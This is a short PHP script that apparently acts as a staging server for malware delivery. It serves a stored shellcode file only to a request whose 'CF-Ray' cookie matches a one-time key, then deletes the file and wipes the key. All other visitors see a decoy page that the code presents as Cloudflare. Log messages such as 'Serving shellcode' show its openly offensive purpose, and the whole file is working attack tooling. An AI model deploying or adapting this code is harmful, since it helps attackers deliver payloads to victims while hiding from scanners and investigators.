<?php 

$cookie_values = file_get_contents("/tmp/.values");
$cookie_values_trim = trim($cookie_values);
error_log(print_r("Cookie in file :: " . $cookie_values_trim, true));

function showCloudflarePHP(){
	echo file_get_contents('fake.php');
        error_log(print_r("[-] Auth failed", true));
}

function showShellcode(){
	file_put_contents("/tmp/.values", "");
	error_log(print_r("[!] Serving shellcode...", true));
	if(file_exists('/tmp/shellcode')){
		echo file_get_contents('/tmp/shellcode');
		if(unlink('/tmp/shellcode')){
			error_log(print_r("[!] Deleted /tmp/shellcode", true));
		}
		else{
			error_log(print_r("[-] Shellcode read failed - file not found", true));
		}
	}
	else{
		error_log(print_r("[-] Shellcode read failed - file not found", true));
		showCloudflarePHP();
	}
}

if(isset($_COOKIE['CF-Ray'])){
	$cookie_value = $_COOKIE['CF-Ray'];
	error_log(print_r($cookie_value, true));
	if($cookie_value === $cookie_values_trim){
		showShellcode();
	}
	else{
		showCloudflarePHP();
	}
}
else{
	error_log(print_r("[!] Cookie not setted", true));
	showCloudflarePHP();
}
?>

